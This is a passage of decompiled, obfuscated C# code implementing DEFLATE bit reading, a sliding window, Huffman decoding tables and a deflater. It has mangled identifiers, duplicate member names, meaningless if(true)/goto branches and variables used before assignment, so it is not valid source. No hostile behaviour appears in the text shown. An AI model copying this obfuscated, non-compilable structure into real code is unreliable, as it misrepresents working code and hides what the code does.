              int num8 = (num4 | num7) << this.\u003F2\u003F;
              obj1.\u003F8\u003F = (uint) (num1 | num8);
            }
            else
              continue;
          }
          else
            goto label_8;
label_2:
          this.\u003F2\u003F += 16;
          break;
label_8:
          if (true)
          {
            if (true)
              return -1;
            goto label_2;
          }
          else
            break;
        }
        long num9 = (long) this.\u003F8\u003F;
        int num10 = 1;
        int num11 = _param1;
        int num12;
        do
        {
          if (true)
            goto label_12;
label_5:
          continue;
label_12:
          int num13 = num11 & 31;
          num12 = num10 << num13;
          if (true)
          {
            num11 = 1;
            num10 = num12;
            goto label_5;
          }
          else
            goto label_15;
        }
        while (num11 == 0);
        goto label_14;
label_6:
        int num14;
        long num15 = (long) num14;
        return (int) (num9 & num15);
label_15:
        num14 = num12;
        goto label_6;
label_14:
        num14 = num10 - num11;
        goto label_6;
      }

      public void \u003F8\u003F(int _param1)
      {
label_0:
        this.\u003F8\u003F >>= _param1;
        do
        {
          if (true)
            this.\u003F2\u003F -= _param1;
          else
            goto label_0;
        }
        while (false);
      }

      public int AvailableBits => this.\u003F2\u003F;

      public int AvailableBytes
      {
        get
        {
          int num1 = this.\u003F1\u003F;
          int num2;
          int num3;
          while (true)
          {
            num2 = this.\u003F8\u003F;
            if (true)
            {
              num3 = num1 - num2;
              if (false)
                num1 = num3;
              else
                goto label_4;
            }
            else
              break;
          }
label_1:
          do
          {
            if (true)
              goto label_6;
label_2:
            continue;
label_6:
            num2 >>= 3;
            goto label_2;
          }
          while (false);
          return num1 + num2;
label_4:
          num2 = this.\u003F2\u003F;
          num1 = num3;
          goto label_1;
        }
      }

      public void \u003F8\u003F()
      {
        this.\u003F8\u003F >>= this.\u003F2\u003F & 7;
        this.\u003F2\u003F &= -8;
      }

      public bool IsNeedingInput => this.\u003F8\u003F == this.\u003F1\u003F;

      public int \u003F8\u003F(byte[] _param1, int _param2, int _param3)
      {
        int num1 = 0;
        int num2;
        int num3;
        while (true)
        {
          num2 = num1;
          int num4;
          while (true)
          {
            num3 = this.\u003F2\u003F;
            if (true)
            {
              if (num3 <= 0)
                goto label_2;
              else
                goto label_12;
label_1:
              this.\u003F8\u003F >>= 8;
              this.\u003F2\u003F -= 8;
              --_param3;
              ++num2;
              continue;
label_2:
              while (_param3 != 0)
              {
                int num5 = this.\u003F1\u003F - this.\u003F8\u003F;
                if (_param3 > num5)
                  goto label_14;
label_6:
                Array.Copy((Array) this.\u003F8\u003F, this.\u003F8\u003F, (Array) _param1, _param2, _param3);
                this.\u003F8\u003F += _param3;
                if ((this.\u003F8\u003F - this.\u003F1\u003F & 1) != 0)
                  goto label_15;
label_7:
                if (true)
                {
                  if (true)
                  {
                    if (true)
                    {
                      int num6 = num2;
                      if (false)
                        return num6;
                      int num7 = _param3;
                      return num6 + num7;
                    }
                    continue;
                  }
                  break;
                }
                goto label_1;
label_15:
                this.\u003F8\u003F = (uint) this.\u003F8\u003F[this.\u003F8\u003F++] & (uint) byte.MaxValue;
                this.\u003F2\u003F = 8;
                goto label_7;
label_14:
                _param3 = num5;
                goto label_6;
              }
              goto label_3;
label_12:
              num4 = _param3;
              if (true)
              {
                if (num4 > 0)
                {
                  _param1[_param2++] = (byte) this.\u003F8\u003F;
                  goto label_1;
                }
                else
                  goto label_2;
              }
              else
                break;
            }
            else
              goto label_4;
          }
          num1 = num4;
        }
label_3:
        return num2;
label_4:
        return num3;
      }

      public void \u003F1\u003F()
      {
        do
        {
          if (true)
            this.\u003F8\u003F = (uint) (this.\u003F8\u003F = this.\u003F1\u003F = this.\u003F2\u003F = 0);
        }
        while (false);
      }

      public void \u003F8\u003F(byte[] _param1, int _param2, int _param3)
      {
        if (true)
          goto label_5;
label_3:
        this.\u003F2\u003F += 8;
label_4:
        this.\u003F8\u003F = _param1;
        this.\u003F8\u003F = _param2;
        int num;
        this.\u003F1\u003F = num;
        return;
label_5:
        if (this.\u003F8\u003F < this.\u003F1\u003F)
          throw new InvalidOperationException();
        num = _param2 + _param3;
        if (0 > _param2 || _param2 > num || num > _param1.Length)
          throw new ArgumentOutOfRangeException();
        if ((_param3 & 1) != 0)
        {
          this.\u003F8\u003F |= (uint) (((int) _param1[_param2++] & (int) byte.MaxValue) << this.\u003F2\u003F);
          goto label_3;
        }
        else
          goto label_4;
      }
    }

    internal sealed class \u003F2\u003F
    {
      private const int \u003F8\u003F = 32768;
      private const int \u003F1\u003F = 32767;
      private byte[] \u003F8\u003F = new byte[32768];
      private int \u003F2\u003F = 0;
      private int \u003F9\u003F = 0;

      public void \u003F8\u003F(int _param1)
      {
        do
        {
          \u003F9\u003F.\u003F2\u003F.\u003F2\u003F obj1 = this;
          int num1;
          int num2 = num1 = obj1.\u003F9\u003F;
          obj1.\u003F9\u003F = num1 + 1;
label_1:
          if (true)
          {
            if (num2 != 32768)
              goto label_3;
label_2:
            continue;
label_3:
            if (true)
            {
              byte[] numArray = this.\u003F8\u003F;
              \u003F9\u003F.\u003F2\u003F.\u003F2\u003F obj2 = this;
              int num3;
              num2 = num3 = obj2.\u003F2\u003F;
              obj2.\u003F2\u003F = num3 + 1;
              int index = num2;
              int num4 = (int) (byte) _param1;
              numArray[index] = (byte) num4;
              if (true)
              {
                if (false)
                  goto label_1;
                else
                  goto label_8;
              }
              else
                goto label_2;
            }
          }
        }
        while (false);
        throw new InvalidOperationException();
label_8:
        this.\u003F2\u003F &= (int) short.MaxValue;
      }

      private void \u003F8\u003F(int _param1, int _param2, int _param3)
      {
        if (false)
          return;
        while (true)
        {
          int num1 = _param2;
          int num2;
          while (true)
          {
            num2 = num1 - 1;
            if (false)
              num1 = num2;
            else
              break;
          }
          _param2 = num2;
          if (num1 > 0)
          {
            byte[] numArray = this.\u003F8\u003F;
            \u003F9\u003F.\u003F2\u003F.\u003F2\u003F obj = this;
            int num3;
            int num4 = num3 = obj.\u003F2\u003F;
            obj.\u003F2\u003F = num3 + 1;
            int index = num4;
            int num5 = (int) this.\u003F8\u003F[_param1++];
            numArray[index] = (byte) num5;
            this.\u003F2\u003F &= (int) short.MaxValue;
            int num6 = _param1;
            if (true)
              goto label_7;
label_5:
            _param1 = num6;
            continue;
label_7:
            num6 &= (int) short.MaxValue;
            goto label_5;
          }
          else
            break;
        }
      }

      public void \u003F8\u003F(int _param1, int _param2)
      {
        if ((this.\u003F9\u003F += _param1) > 32768)
          throw new InvalidOperationException();
        int sourceIndex = this.\u003F2\u003F - _param2 & (int) short.MaxValue;
        int num = 32768 - _param1;
        if (sourceIndex > num || this.\u003F2\u003F >= num)
          this.\u003F8\u003F(sourceIndex, _param1, _param2);
        else if (_param1 > _param2)
        {
          while (_param1-- > 0)
            this.\u003F8\u003F[this.\u003F2\u003F++] = this.\u003F8\u003F[sourceIndex++];
        }
        else
        {
          Array.Copy((Array) this.\u003F8\u003F, sourceIndex, (Array) this.\u003F8\u003F, this.\u003F2\u003F, _param1);
          this.\u003F2\u003F += _param1;
        }
      }

      public int \u003F8\u003F(\u003F9\u003F.\u003F2\u003F.\u003F1\u003F _param1, int _param2)
      {
        int val1 = _param2;
        if (true)
          goto label_9;
label_5:
        int val2_1 = _param1.AvailableBytes;
        int num1;
        while (true)
        {
          int num2 = Math.Min(val1, val2_1);
          int num3;
          while (true)
          {
            _param2 = num2;
            num3 = 32768;
            if (num3 == 0)
              num2 = num3;
            else
              break;
          }
          int num4 = num3 - this.\u003F2\u003F;
label_1:
          if (_param2 > num4)
            goto label_10;
label_3:
          num1 = _param1.\u003F8\u003F(this.\u003F8\u003F, this.\u003F2\u003F, _param2);
label_4:
          this.\u003F2\u003F = this.\u003F2\u003F + num1 & (int) short.MaxValue;
          if (true)
          {
            this.\u003F9\u003F += num1;
            if (false)
              goto label_3;
            else
              break;
          }
          else
            goto label_1;
label_10:
          if (true)
            goto label_11;
label_2:
          num1 += _param1.\u003F8\u003F(this.\u003F8\u003F, 0, _param2 - num4);
          goto label_4;
label_11:
          num1 = _param1.\u003F8\u003F(this.\u003F8\u003F, this.\u003F2\u003F, num4);
          int num5 = num1;
          int num6 = num4;
          if (false)
          {
            val2_1 = num6;
            val1 = num5;
          }
          else if (num5 != num6)
            goto label_4;
          else
            goto label_2;
        }
        return num1;
label_9:
        int val2_2 = 32768 - this.\u003F9\u003F;
        val1 = Math.Min(val1, val2_2);
        goto label_5;
      }

      public void \u003F8\u003F(byte[] _param1, int _param2, int _param3)
      {
        if (this.\u003F9\u003F > 0)
          throw new InvalidOperationException();
        int num1 = _param3;
label_1:
        int num2;
        for (int index = 32768; num1 > index; num1 = num2)
        {
          num2 = _param2;
          if (false)
          {
            num1 = num2;
            goto label_1;
          }
          else
          {
            int num3 = _param3;
            if (false)
            {
              index = num3;
            }
            else
            {
              if (true)
                goto label_13;
label_2:
              int num4 = num2 + num3;
              if (true)
                goto label_14;
label_9:
              _param3 = num4;
              break;
label_14:
              if (true)
                goto label_8;
label_3:
              num4 = 32768;
              goto label_9;
label_8:
              _param2 = num4;
              goto label_3;
label_13:
              num3 -= 32768;
              goto label_2;
            }
          }
        }
        do
        {
          Array.Copy((Array) _param1, _param2, (Array) this.\u003F8\u003F, 0, _param3);
          this.\u003F2\u003F = _param3 & (int) short.MaxValue;
        }
        while (false);
      }

      public int \u003F8\u003F() => 32768 - this.\u003F9\u003F;

      public int \u003F1\u003F() => this.\u003F9\u003F;

      public int \u003F8\u003F(byte[] _param1, int _param2, int _param3)
      {
        int num1 = this.\u003F2\u003F;
        if (_param3 <= this.\u003F9\u003F)
          goto label_8;
        else
          goto label_7;
label_1:
        int num2;
        do
        {
          num2 = _param3;
        }
        while (false);
        int num3 = _param3;
        int num4;
        int num5;
        int num6;
        if (false)
        {
          num4 = num3;
          goto label_9;
        }
        else
        {
          int num7 = num1;
          int length = num3 - num7;
          while (length > 0)
          {
            Array.Copy((Array) this.\u003F8\u003F, 32768 - length, (Array) _param1, _param2, length);
            if (true)
            {
              int num8 = _param2;
              num6 = length;
              num5 = num8;
              goto label_3;
            }
          }
          goto label_4;
        }
label_3:
        _param2 = num5 + num6;
        if (true)
          _param3 = num1;
        else
          goto label_5;
label_4:
        Array.Copy((Array) this.\u003F8\u003F, num1 - _param3, (Array) _param1, _param2, _param3);
        this.\u003F9\u003F -= num2;
label_5:
        if (this.\u003F9\u003F < 0)
          throw new InvalidOperationException();
        if (true)
          return num2;
        goto label_1;
label_7:
        _param3 = this.\u003F9\u003F;
        goto label_1;
label_8:
        num4 = this.\u003F2\u003F;
label_9:
        int num9 = this.\u003F9\u003F;
        num5 = num4 - num9;
        num6 = _param3;
        if (true)
        {
          num1 = num5 + num6 & (int) short.MaxValue;
          goto label_1;
        }
        else
          goto label_3;
      }

      public void \u003F8\u003F() => this.\u003F9\u003F = this.\u003F2\u003F = 0;
    }

    internal sealed class \u003F9\u003F
    {
      private const int \u003F8\u003F = 15;
      private short[] \u003F8\u003F;
      public static readonly \u003F9\u003F.\u003F2\u003F.\u003F9\u003F \u003F8\u003F;
      public static readonly \u003F9\u003F.\u003F2\u003F.\u003F9\u003F \u003F1\u003F;

      static \u003F9\u003F()
      {
        byte[] numArray = new byte[288];
label_1:
        int num1;
        while (true)
        {
          if (true)
            goto label_10;
label_2:
          if (true)
          {
            while (num1 < 144)
              numArray[num1++] = (byte) 8;
            if (true)
            {
              for (; num1 < 256; numArray[num1++] = (byte) 9)
              {
                if (false)
                  goto label_1;
              }
              goto label_4;
            }
            else
              break;
          }
          else
            goto label_6;
label_10:
          num1 = 0;
          goto label_2;
        }
        goto label_7;
label_4:
        int num2;
        int num3;
        while (true)
        {
          num2 = num1;
          num3 = 280;
          if (num3 != 0)
          {
            if (num2 < num3)
              numArray[num1++] = (byte) 7;
            else
              goto label_6;
          }
          else
            break;
        }
        int num4 = num3;
        int num5 = num2;
        goto label_20;
label_6:
        while (num1 < 288)
          numArray[num1++] = (byte) 8;
        \u003F9\u003F.\u003F2\u003F.\u003F9\u003F.\u003F8\u003F = new \u003F9\u003F.\u003F2\u003F.\u003F9\u003F(numArray);
        numArray = new byte[32];
label_7:
        num1 = 0;
label_9:
        num5 = num1;
        num4 = 32;
label_20:
        if (num5 < num4)
        {
          numArray[num1++] = (byte) 5;
          goto label_9;
        }
        else if (true)
          \u003F9\u003F.\u003F2\u003F.\u003F9\u003F.\u003F1\u003F = new \u003F9\u003F.\u003F2\u003F.\u003F9\u003F(numArray);
        else
          goto label_4;
      }

      public \u003F9\u003F(byte[] _param1) => this.\u003F8\u003F(_param1);

      private void \u003F8\u003F(byte[] _param1)
      {
        int[] numArray1 = new int[16];
        int[] numArray2 = new int[16];
        int index1 = 0;
        int num1;
        int num2;
        while (true)
        {
          num1 = index1;
          num2 = _param1.Length;
          if (true)
          {
            int num3 = num2;
            if (num1 < num3)
            {
              int num4 = (int) _param1[index1];
              int num5;
              if (true)
                num5 = num4;
              if (num5 > 0)
                goto label_25;
label_1:
              ++index1;
              continue;
label_25:
              int[] numArray3;
              int index2;
              (numArray3 = numArray1)[index2 = num5] = numArray3[(IntPtr) index2] + 1;
              goto label_1;
            }
            else
              goto label_27;
          }
          else
            break;
        }
label_4:
        int num6 = 16;
        int index3;
        int num7 = index3;
        int num8;
        if (true)
        {
          int num9 = num6 - num7 & 31;
          int num10 = num2 << num9;
          num8 = num1 + num10;
        }
        else
          goto label_12;
label_5:
        if (index3 >= 10)
          goto label_30;
label_6:
        int num11 = index3;
        int num12 = 1;
        goto label_7;
label_30:
        int num13 = numArray2[index3] & 130944;
        int num14 = num8 & 130944;
        int length;
        length += num14 - num13 >> 16 - index3;
        goto label_6;
label_7:
        index3 = num11 + num12;
label_8:
        int index4;
        int num15;
        if (index3 <= 15)
        {
          numArray2[index3] = num8;
          int num16 = num8;
          num2 = numArray1[index3];
          num1 = num16;
          goto label_4;
        }
        else
        {
          this.\u003F8\u003F = new short[length];
          num15 = 512;
          index4 = 15;
          goto label_14;
        }
label_9:
        int num17 = num8 & 130944;
        num8 -= numArray1[index4] << 16 - index4;
        int num18 = num8 & 130944;
        goto label_13;
label_11:
        int num19;
        int num20 = num19 - 9;
        num7 = 31;
        num6 = num20;
        int num21;
        num2 = num21;
        int num22;
        num1 = num22;
label_12:
        int num23 = num6 & num7;
        int num24 = num2 << num23;
        num15 = num1 + num24;
        num18 += 128;
label_13:
        if (num18 < num17)
        {
          this.\u003F8\u003F[(int) \u003F9\u003F.\u003F2\u003F.\u003F16\u003F.\u003F8\u003F(num18)] = (short) (-num15 << 4 | index4);
          num22 = num15;
          num21 = 1;
          num19 = index4;
          goto label_11;
        }
        else
          --index4;
label_14:
        int index5;
        if (index4 < 10)
        {
          if (true)
          {
            index5 = 0;
            goto label_21;
          }
          else
            goto label_5;
        }
        else
          goto label_9;
label_19:
        int index6;
        numArray2[index6] = num8 + (1 << 16 - index6);
label_20:
        ++index5;
label_21:
        if (index5 >= _param1.Length)
          return;
        index6 = (int) _param1[index5];
        if (index6 != 0)
        {
          num8 = numArray2[index6];
          int index7 = (int) \u003F9\u003F.\u003F2\u003F.\u003F16\u003F.\u003F8\u003F(num8);
          if (index6 <= 9)
          {
            do
            {
              this.\u003F8\u003F[index7] = (short) (index5 << 4 | index6);
              index7 += 1 << index6;
              if (false)
                goto label_9;
            }
            while (index7 < 512);
            goto label_19;
          }
          else
          {
            int num25 = (int) this.\u003F8\u003F[index7 & 511];
            int num26 = 1 << (num25 & 15);
            int num27 = -(num25 >> 4);
            int num28;
            int num29;
            int num30;
            int num31;
            int num32;
            int num33;
            do
            {
              this.\u003F8\u003F[num27 | index7 >> 9] = (short) (index5 << 4 | index6);
              num28 = index7;
              num29 = 1;
              num30 = index6 & 31;
              if (true)
              {
                num31 = num29 << num30;
                if (true)
                {
                  index7 = num28 + num31;
                  num32 = index7;
                  num33 = num26;
                  if (false)
                    goto label_40;
                }
                else
                  goto label_41;
              }
              else
                goto label_42;
            }
            while (num32 < num33);
            goto label_19;
label_40:
            num2 = num33;
            num1 = num32;
            goto label_4;
label_41:
            num12 = num31;
            num11 = num28;
            goto label_7;
label_42:
            num19 = num30;
            num21 = num29;
            num22 = num28;
            goto label_11;
          }
        }
        else
          goto label_20;
label_27:
        num8 = 0;
        length = 512;
        if (true)
        {
          index3 = 1;
          goto label_8;
        }
        else
          goto label_19;
      }

      public int \u003F8\u003F(\u003F9\u003F.\u003F2\u003F.\u003F1\u003F _param1)
      {
        int num1;
        int index = num1 = _param1.\u003F8\u003F(9);
        int num2;
        int num3;
        int num4;
        int num5;
        int num6;
        int num7;
        while (true)
        {
          if (num1 < 0)
            goto label_12;
          else
            goto label_14;
label_5:
          int availableBits1;
          int num8;
          if (true)
          {
            if (num4 < 0)
            {
              availableBits1 = _param1.AvailableBits;
              index = _param1.\u003F8\u003F(availableBits1);
              num8 = (int) this.\u003F8\u003F[num3 | index >> 9];
            }
            else
              goto label_21;
          }
          else
            break;
label_9:
          num2 = num8;
          if ((num2 & 15) <= availableBits1)
          {
            _param1.\u003F8\u003F(num2 & 15);
            num5 = num2 >> 4;
          }
          else
            goto label_11;
label_10:
          if (false)
          {
            num1 = num5;
            continue;
          }
          goto label_7;
label_12:
          int availableBits2 = _param1.AvailableBits;
          index = _param1.\u003F8\u003F(availableBits2);
          num2 = (int) this.\u003F8\u003F[index];
          num4 = num2;
          if (true)
          {
            if (num4 >= 0)
            {
              num6 = num2 & 15;
              if (true)
              {
                if (false)
                {
                  num8 = num6;
                  goto label_9;
                }
                else
                {
                  int num9 = availableBits2;
                  if (num6 <= num9)
                  {
                    _param1.\u003F8\u003F(num2 & 15);
                    num7 = num2;
                    if (false)
                    {
                      num5 = num7;
                      goto label_10;
                    }
                    else
                      goto label_29;
                  }
                  else
                    goto label_13;
                }
              }
              else
                goto label_33;
            }
            else
              goto label_13;
          }
          else
            goto label_5;
label_14:
          int num10 = (int) this.\u003F8\u003F[index];
          int num11;
          while (true)
          {
            if (true)
              goto label_15;
label_3:
            num11 = 0;
            if (num11 != 0)
            {
              num10 = num11;
              continue;
            }
            break;
label_15:
            num2 = num10;
            goto label_3;
          }
          if (num10 < num11)
          {
            num3 = -(num2 >> 4);
            int num12 = num2 & 15;
            num4 = index = _param1.\u003F8\u003F(num12);
            goto label_5;
          }
          else
            goto label_16;
        }
label_6:
        return num4 >> 4;
label_11:
        return -1;
label_13:
        return -1;
label_16:
        \u003F9\u003F.\u003F2\u003F.\u003F1\u003F obj = _param1;
        int num13 = num2 & 15;
        if (true)
          obj.\u003F8\u003F(num13);
        return num2 >> 4;
label_21:
        int num14 = (int) this.\u003F8\u003F[num3 | index >> 9];
        _param1.\u003F8\u003F(num14 & 15);
        num4 = num14;
        goto label_6;
label_7:
        return num5;
label_33:
        return num6;
label_29:
        return num7 >> 4;
      }
    }

    internal sealed class \u003F3\u003F
    {
      private const int \u003F8\u003F = 0;
      private const int \u003F1\u003F = 1;
      private const int \u003F2\u003F = 2;
      private const int \u003F9\u003F = 3;
      private const int \u003F3\u003F = 4;
      private const int \u003F4\u003F = 5;
      private static readonly int[] \u003F8\u003F;
      private static readonly int[] \u003F1\u003F;
      private byte[] \u003F8\u003F;
      private byte[] \u003F1\u003F;
      private \u003F9\u003F.\u003F2\u003F.\u003F9\u003F \u003F8\u003F;
      private int \u003F16\u003F;
      private int \u003F5\u003F;
      private int \u003F6\u003F;
      private int \u003F7\u003F;
      private int \u003F23\u003F;
      private int \u003F24\u003F;
      private byte \u003F8\u003F;
      private int \u003F25\u003F;
      private static readonly int[] \u003F2\u003F;

      public bool \u003F8\u003F(\u003F9\u003F.\u003F2\u003F.\u003F1\u003F _param1)
      {
        int num1;
        while (true)
        {
          int num2;
          int num3;
          int num4;
          int num5;
          switch (this.\u003F16\u003F)
          {
            case 0:
              this.\u003F5\u003F = _param1.\u003F8\u003F(5);
              num1 = this.\u003F5\u003F;
              if (true)
              {
                if (num1 >= 0)
                {
                  this.\u003F5\u003F += 257;
                  _param1.\u003F8\u003F(5);
                  this.\u003F16\u003F = 1;
                  goto case 1;
                }
                else
                  goto label_21;
              }
              else
                goto label_7;
            case 1:
              this.\u003F6\u003F = _param1.\u003F8\u003F(5);
              if (this.\u003F6\u003F >= 0)
              {
                ++this.\u003F6\u003F;
                _param1.\u003F8\u003F(5);
                this.\u003F23\u003F = this.\u003F5\u003F + this.\u003F6\u003F;
                this.\u003F1\u003F = new byte[this.\u003F23\u003F];
                this.\u003F16\u003F = 2;
                goto case 2;
              }
              else
                goto label_22;
            case 2:
              this.\u003F7\u003F = _param1.\u003F8\u003F(4);
              if (this.\u003F7\u003F >= 0)
              {
                this.\u003F7\u003F += 4;
                _param1.\u003F8\u003F(4);
                this.\u003F8\u003F = new byte[19];
                this.\u003F25\u003F = 0;
                this.\u003F16\u003F = 3;
                goto case 3;
              }
              else
                goto label_23;
            case 3:
label_9:
              if (this.\u003F25\u003F < this.\u003F7\u003F)
              {
                num2 = _param1.\u003F8\u003F(3);
                num3 = num2;
                num4 = 0;
                break;
              }
              this.\u003F8\u003F = new \u003F9\u003F.\u003F2\u003F.\u003F9\u003F(this.\u003F8\u003F);
              this.\u003F8\u003F = (byte[]) null;
              this.\u003F25\u003F = 0;
              this.\u003F16\u003F = 4;
              goto case 4;
            case 4:
              int num6;
              int num7;
              do
              {
                num5 = this.\u003F8\u003F.\u003F8\u003F(_param1);
                if (true)
                {
                  int num8 = num5;
                  if ((num5 & -16) == 0)
                  {
                    this.\u003F1\u003F[this.\u003F25\u003F++] = this.\u003F8\u003F = (byte) num8;
                    num6 = this.\u003F25\u003F;
                    num7 = this.\u003F23\u003F;
                    if (false)
                      goto label_37;
                  }
                  else if (num8 >= 0)
                  {
                    if (num8 >= 17)
                      goto label_32;
label_13:
                    this.\u003F24\u003F = num8 - 16;
                    this.\u003F16\u003F = 5;
                    goto case 5;
label_32:
                    this.\u003F8\u003F = (byte) 0;
                    goto label_13;
                  }
                  else
                    goto label_31;
                }
                else
                  goto label_35;
              }
              while (num6 != num7);
              goto label_28;
label_37:
              num4 = num7;
              num3 = num6;
              break;
            case 5:
              int num9 = \u003F9\u003F.\u003F2\u003F.\u003F3\u003F.\u003F1\u003F[this.\u003F24\u003F];
              int num10 = _param1.\u003F8\u003F(num9);
              if (num10 >= 0)
              {
                _param1.\u003F8\u003F(num9);
                int num11 = num10 + \u003F9\u003F.\u003F2\u003F.\u003F3\u003F.\u003F8\u003F[this.\u003F24\u003F];
                while (num11-- > 0)
                  this.\u003F1\u003F[this.\u003F25\u003F++] = this.\u003F8\u003F;
                int num12 = this.\u003F25\u003F;
                num5 = this.\u003F23\u003F;
                num5 = num12;
                goto label_35;
              }
              else
                goto label_33;
            default:
              continue;
          }
          if (num3 >= num4)
          {
            _param1.\u003F8\u003F(3);
            this.\u003F8\u003F[\u003F9\u003F.\u003F2\u003F.\u003F3\u003F.\u003F2\u003F[this.\u003F25\u003F]] = (byte) num2;
            ++this.\u003F25\u003F;
            goto label_9;
          }
          else
            goto label_25;
label_35:
          if (num5 != num5)
            this.\u003F16\u003F = 4;
          else
            goto label_36;
        }
label_7:
        return num1 != 0;
label_21:
        return false;
label_22:
        return false;
label_23:
        return false;
label_25:
        return false;
label_28:
        return true;
label_31:
        return false;
label_33:
        return false;
label_36:
        return true;
      }

      public \u003F9\u003F.\u003F2\u003F.\u003F9\u003F \u003F8\u003F()
      {
        byte[] destinationArray = new byte[this.\u003F5\u003F];
        Array.Copy((Array) this.\u003F1\u003F, 0, (Array) destinationArray, 0, this.\u003F5\u003F);
        return new \u003F9\u003F.\u003F2\u003F.\u003F9\u003F(destinationArray);
      }

      public \u003F9\u003F.\u003F2\u003F.\u003F9\u003F \u003F1\u003F()
      {
        byte[] destinationArray = new byte[this.\u003F6\u003F];
        Array.Copy((Array) this.\u003F1\u003F, this.\u003F5\u003F, (Array) destinationArray, 0, this.\u003F6\u003F);
        return new \u003F9\u003F.\u003F2\u003F.\u003F9\u003F(destinationArray);
      }

      static \u003F3\u003F()
      {
label_0:
        int length1 = 3;
        int length2;
        while (true)
        {
          int[] numArray1 = new int[length1];
          // ISSUE: field reference
          RuntimeHelpers.InitializeArray((Array) numArray1, __fieldref (\u003F3\u003F.\u003F8\u003F));
          \u003F9\u003F.\u003F2\u003F.\u003F3\u003F.\u003F8\u003F = numArray1;
label_2:
          if (true)
          {
            length2 = 3;
            if (length2 != 0)
              goto label_5;
label_3:
            if (length2 == 0)
            {
              length1 = length2;
              continue;
            }
            break;
label_5:
            int[] numArray2 = new int[length2];
            // ISSUE: field reference
            RuntimeHelpers.InitializeArray((Array) numArray2, __fieldref (\u003F3\u003F.\u003F8\u003F));
            \u003F9\u003F.\u003F2\u003F.\u003F3\u003F.\u003F1\u003F = numArray2;
            if (true)
            {
              length2 = 19;
              goto label_3;
            }
            else
              goto label_2;
          }
          else
            goto label_0;
        }
        int[] numArray = new int[length2];
        // ISSUE: field reference
        RuntimeHelpers.InitializeArray((Array) numArray, __fieldref (\u003F3\u003F.\u003F8\u003F));
        \u003F9\u003F.\u003F2\u003F.\u003F3\u003F.\u003F2\u003F = numArray;
      }
    }

    internal sealed class \u003F4\u003F
    {
      private const int \u003F8\u003F = 4;
      private const int \u003F1\u003F = 8;
      private const int \u003F2\u003F = 16;
      private const int \u003F9\u003F = 20;
      private const int \u003F3\u003F = 28;
      private const int \u003F4\u003F = 30;
      private int \u003F16\u003F = 16;
      private long \u003F8\u003F = 0;
      private \u003F9\u003F.\u003F2\u003F.\u003F6\u003F \u003F8\u003F;
      private \u003F9\u003F.\u003F2\u003F.\u003F5\u003F \u003F8\u003F;

      public \u003F4\u003F()
      {
        this.\u003F8\u003F = new \u003F9\u003F.\u003F2\u003F.\u003F6\u003F();
        this.\u003F8\u003F = new \u003F9\u003F.\u003F2\u003F.\u003F5\u003F(this.\u003F8\u003F);
      }

      public long TotalOut => this.\u003F8\u003F;

      public void \u003F8\u003F() => this.\u003F16\u003F |= 12;

      public bool IsFinished => this.\u003F16\u003F == 30 && this.\u003F8\u003F.IsFlushed;

      public bool IsNeedingInput => this.\u003F8\u003F.\u003F8\u003F();

      public void \u003F8\u003F(byte[] _param1) => this.\u003F8\u003F.\u003F8\u003F(_param1);

      public int \u003F8\u003F(byte[] _param1)
      {
        int num1 = 0;
        int length = _param1.Length;
label_8:
        int num2 = length;
label_9:
        do
        {
          int num3 = this.\u003F8\u003F.\u003F8\u003F(_param1, num1, length);
          num1 += num3;
          this.\u003F8\u003F += (long) num3;
          length -= num3;
          if (true)
          {
            if (length == 0 || this.\u003F16\u003F == 30)
              goto label_7;
          }
          else
            goto label_8;
        }
        while (this.\u003F8\u003F.\u003F1\u003F((this.\u003F16\u003F & 4) != 0, (this.\u003F16\u003F & 8) != 0));
label_1:
        while (this.\u003F16\u003F != 16)
        {
          int num4;
          int num5;
          while (true)
          {
            if (this.\u003F16\u003F != 20)
            {
              if (true)
              {
                if (this.\u003F16\u003F == 28)
                {
                  this.\u003F8\u003F.\u003F8\u003F();
                  this.\u003F16\u003F = 30;
                  goto label_9;
                }
                else
                  goto label_9;
              }
              else
                goto label_1;
            }
            else if (true)
            {
              int num6 = 8;
              if (num6 == 0)
                return num6;
              int num7 = -this.\u003F8\u003F.BitCount;
              if (true)
              {
                num4 = num6 + (num7 & 7);
                goto label_3;
              }
              else
              {
                num5 = num7;
                num4 = num6;
                goto label_20;
              }
            }
          }
          goto label_5;
label_3:
          int num8 = num4;
label_5:
          num4 = num8;
          if (true)
            num5 = 0;
          else
            goto label_3;
label_20:
          if (num4 > num5)
          {
            this.\u003F8\u003F.\u003F8\u003F(2, 10);
            num8 -= 10;
            goto label_5;
          }
          else
          {
            this.\u003F16\u003F = 16;
            goto label_9;
          }
        }
        return num2 - length;
label_7:
        return num2 - length;
      }
    }

    internal sealed class \u003F16\u003F
    {
      private const int \u003F8\u003F = 16384;
      private const int \u003F1\u003F = 286;
      private const int \u003F2\u003F = 30;
      private const int \u003F9\u003F = 19;
      private const int \u003F3\u003F = 16;
      private const int \u003F4\u003F = 17;
      private const int \u003F16\u003F = 18;
      private const int \u003F5\u003F = 256;
      private static readonly int[] \u003F8\u003F;
      private static readonly byte[] \u003F8\u003F;
      private \u003F9\u003F.\u003F2\u003F.\u003F6\u003F \u003F8\u003F;
      private \u003F9\u003F.\u003F2\u003F.\u003F16\u003F.\u003F8\u003F \u003F8\u003F;
      private \u003F9\u003F.\u003F2\u003F.\u003F16\u003F.\u003F8\u003F \u003F1\u003F;
      private \u003F9\u003F.\u003F2\u003F.\u003F16\u003F.\u003F8\u003F \u003F2\u003F;
      private short[] \u003F8\u003F;
      private byte[] \u003F1\u003F;
      private int \u003F6\u003F;
      private int \u003F7\u003F;
      private static readonly short[] \u003F1\u003F;
      private static readonly byte[] \u003F2\u003F;
      private static readonly short[] \u003F2\u003F;
      private static readonly byte[] \u003F9\u003F;

      public static short \u003F8\u003F(int _param0) => (short) ((int) \u003F9\u003F.\u003F2\u003F.\u003F16\u003F.\u003F8\u003F[_param0 & 15] << 12 | (int) \u003F9\u003F.\u003F2\u003F.\u003F16\u003F.\u003F8\u003F[_param0 >> 4 & 15] << 8 | (int) \u003F9\u003F.\u003F2\u003F.\u003F16\u003F.\u003F8\u003F[_param0 >> 8 & 15] << 4 | (int) \u003F9\u003F.\u003F2\u003F.\u003F16\u003F.\u003F8\u003F[_param0 >> 12]);

      static \u003F16\u003F()
      {
label_0:
        \u003F9\u003F.\u003F2\u003F.\u003F16\u003F.\u003F8\u003F = new int[19]
        {
          16,
          17,
          18,
          0,
          8,
          7,
          9,
          6,
          10,
          5,
          11,
          4,
          12,
          3,
          13,
          2,
          14,
          1,
          15
        };
label_1:
        \u003F9\u003F.\u003F2\u003F.\u003F16\u003F.\u003F8\u003F = new byte[16]
        {
          (byte) 0,
          (byte) 8,
          (byte) 4,
          (byte) 12,
